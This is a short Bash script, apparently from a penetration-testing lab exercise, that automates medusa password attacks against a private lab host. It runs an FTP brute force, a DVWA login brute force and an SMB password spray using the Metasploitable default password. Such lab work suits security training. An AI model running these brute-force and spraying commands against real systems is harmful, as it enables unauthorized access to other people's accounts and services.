#!/bin/bash
TARGET="192.168.56.20"
echo "🚀 Iniciando ataques automatizados..."

echo "1️⃣ FTP Brute Force"
medusa -h $TARGET -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -T 10 -f

echo "2️⃣ DVWA Login"
medusa -h $TARGET -u admin -P wordlists/passwords.txt -M http -m DIR:/DVWA/vulnerabilities/brute/ -T 5

echo "3️⃣ SMB Password Spray"
medusa -h $TARGET -U wordlists/users.txt -p msfadmin -M smbnt

echo "✅ Ataques concluídos. Veja screenshots em /images/"
